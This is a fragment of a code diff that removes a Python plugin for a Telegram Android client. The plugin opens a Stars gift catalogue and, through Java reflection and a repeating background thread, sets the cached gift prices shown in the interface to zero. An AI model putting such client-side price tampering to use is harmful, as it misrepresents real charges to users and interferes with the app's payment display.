-                        self._log_exc("open_gift_menu/putUser", e)
-
-                    run_on_ui_thread(lambda: self.show_gift_ui(account, user))
-                except Exception as e:
-                    self._log_exc("on_resolved", e)
-
-            self._log("[OPEN] Отправляю запрос TL_contacts_resolveUsername")
-            send_request(req, on_resolved)
-        except Exception as e:
-            self._log_exc("open_gift_menu", e)
-
-    # ---------- Заморозка цен ----------
-
-    def _zero_out_object(self, obj):
-        if not obj: return
-        cls = obj.getClass()
-        cls_name = cls.getName()
-        
-        if cls_name not in self._reflection_cache:
-            fields = []
-            for field_name in ["stars", "price", "amount", "starCount"]:
-                f = None
-                try:
-                    f = cls.getField(field_name)
-                except Exception:
-                    try:
-                        f = cls.getDeclaredField(field_name)
-                    except Exception:
-                        pass
-                
-                if f:
-                    try:
-                        f.setAccessible(True)
-                        t = f.getType().getName()
-                        fields.append((f, t))
-                    except Exception:
-                        pass
-            self._reflection_cache[cls_name] = fields
-
-        for f, t in self._reflection_cache[cls_name]:
-            try:
-                if t == "long":
-                    f.setLong(obj, 0)
-                elif t == "int":
-                    f.setInt(obj, 0)
-            except Exception:
-                pass
-
-    def _zero_out_list(self, options):
-        if not options: return
-        try:
-            for i in range(options.size()):
-                opt = options.get(i)
-                if not opt: continue
-                
-                self._zero_out_object(opt)
-                
-                cls = opt.getClass()
-                cls_name = cls.getName() + "_inners"
-                
-                if cls_name not in self._reflection_cache:
-                    inner_fields = []
-                    for inner_name in ["gift", "starGift", "item"]:
-                        try:
-                            inner_f = cls.getDeclaredField(inner_name)
-                            inner_f.setAccessible(True)
-                            inner_fields.append(inner_f)
-                        except Exception:
-                            pass
-                    self._reflection_cache[cls_name] = inner_fields
-
-                for inner_f in self._reflection_cache[cls_name]:
-                    try:
-                        inner_obj = inner_f.get(opt)
-                        if inner_obj:
-                            self._zero_out_object(inner_obj)
-                    except Exception:
-                        pass
-        except Exception:
-            pass
-
-    def _patch_stars_controller_cache(self, account: int):
-        try:
-            from java import jclass
-            StarsController = jclass("org.telegram.ui.Stars.StarsController")
-            controller = StarsController.getInstance(account)
-            
-            cached_lists = ["starGifts", "gifts", "availableGifts"]
-            for list_name in cached_lists:
-                try:
-                    f = controller.getClass().getDeclaredField(list_name)
-                    f.setAccessible(True)
-                    cache = f.get(controller)
-                    if cache and hasattr(cache, "size"):
-                        self._zero_out_list(cache)
-                except Exception:
-                    pass
-        except Exception:
-            pass
-
-    def _apply_zero_patches(self, account: int, sheet):
-        try:
-            if sheet and hasattr(sheet, "isShowing") and not sheet.isShowing():
-                return
-        except Exception:
-            pass
-
-        self._patch_stars_controller_cache(account)
-
-        if sheet:
-            try:
-                for field_name in ["gifts", "starGifts", "items", "options", "availableGifts"]:
-                    try:
-                        f = sheet.getClass().getDeclaredField(field_name)
-                        f.setAccessible(True)
-                        lst = f.get(sheet)
-                        if lst and hasattr(lst, "size"):
-                            self._zero_out_list(lst)
-                    except Exception:
-                        pass
-            except Exception:
-                pass
-
-    def _start_price_freezer(self, account: int, sheet):
-        def freezer_task():
-            for _ in range(50):
-                time.sleep(0.1)
-                try:
-                    run_on_ui_thread(lambda: self._apply_zero_patches(account, sheet))
-                except Exception:
-                    break
-            for _ in range(30):
-                time.sleep(0.5)
-                try:
-                    run_on_ui_thread(lambda: self._apply_zero_patches(account, sheet))
-                except Exception:
-                    break
-
-        threading.Thread(target=freezer_task, daemon=True).start()
-
-    # ---------- UI и открытие меню ----------
-
-    def _create_and_show_sheet(self, GiftSheet, context, account, user_id, options):
-        self._log(f"[SHEET] _create_and_show_sheet: user_id={user_id} options={'есть' if options else 'None'}")
-        try:
-            sheet = GiftSheet(context, account, user_id, options, None)
-            self._log("[SHEET] GiftSheet создан, вызываю show()")
-            sheet.show()
-            self._current_sheet = sheet
-            self._log("[SHEET] sheet.show() выполнен, каталог должен быть на экране")
-            self._start_price_freezer(account, sheet)
-            
-            self._hook_ui_elements(sheet, context)
-            
-        except Exception as e:
-            self._log_exc("_create_and_show_sheet", e)
-
-    def show_gift_ui(self, account: int, user):
-        from java import jclass, dynamic_proxy
-
-        self._log(f"[SHOW] show_gift_ui: account={account} user_id={user.id}")
-
-        fragment = get_last_fragment()
-        if fragment is None:
-            self._log("[SHOW] ОШИБКА: fragment is None")
-            return
-        context = fragment.getParentActivity()
-        if context is None:
-            self._log("[SHOW] ОШИБКА: getParentActivity() is None")
-            return
-
-        try:
-            GiftSheet = jclass("org.telegram.ui.Gifts.GiftSheet")
-            self._log("[SHOW] Класс GiftSheet найден")
-        except Exception as e:
-            self._log(f"[SHOW] Класс org.telegram.ui.Gifts.GiftSheet НЕ найден ({e}), пробую fallback на профиль")
-            self._open_profile_fallback(fragment, user)
-            return
-
-        self._patch_stars_controller_cache(account)
-
-        loaded_via_repo = False
-        for class_path in BOOST_REPOSITORY_CANDIDATES:
-            try:
-                Repo = jclass(class_path)
-                CallbackIface = jclass(class_path + "$OnGiftOptionsLoaded")
-                self._log(f"[SHOW] Найден репозиторий: {class_path}, загружаю опции подарков")
-
-                class OptionsCallback(dynamic_proxy(CallbackIface)):
-                    def onGiftOptionsLoaded(self_inner, options):
-                        try:
-                            self._log(f"[SHOW] onGiftOptionsLoaded вызван, options={'есть' if options else 'None'}")
-                            self._zero_out_list(options)
-                            run_on_ui_thread(lambda: self._create_and_show_sheet(GiftSheet, context, account, user.id, options))
-                        except Exception as e:
-                            self._log_exc("onGiftOptionsLoaded", e)
-
-                Repo.loadGiftOptions(account, None, OptionsCallback())
-                loaded_via_repo = True
-                return
-            except Exception as e:
-                self._log(f"[SHOW] Репозиторий {class_path} недоступен: {e}")
-
-        if not loaded_via_repo:
-            self._log("[SHOW] Ни один BOOST_REPOSITORY не найден, открываю sheet без опций (options=None)")
-        self._create_and_show_sheet(GiftSheet, context, account, user.id, None)
-
-    def _open_profile_fallback(self, fragment, user):
-        try:
-            from java import jclass
-            ProfileActivity = jclass("org.telegram.ui.ProfileActivity")
-            Bundle = jclass("android.os.Bundle")
-            args = Bundle()
-            args.putLong("user_id", user.id)
-            fragment.presentFragment(ProfileActivity(args))
-        except Exception as e:
-            self._log_exc("_open_profile_fallback", e)
-
-    def create_settings(self) -> List[Any]:
-        return [
-            Header(text="Gift Menu"),
-            Text(text="Показать логи", icon="msg_log", on_click=self._show_logs_dialog),
-        ]
-
-    def _show_logs_dialog(self, view):
-        context = view.getContext()
-        full_text = "\n".join(self._logs) if self._logs else "Логов пока нет."
-        builder = AlertDialogBuilder(context)
-        builder.set_title("Логи gift_menu")
-        builder.set_message(full_text)
-        builder.set_positive_button("Закрыть", lambda b, w: b.dismiss())
-        builder.show()
+if __name__ == "__main__":
+    sys.exit(main())
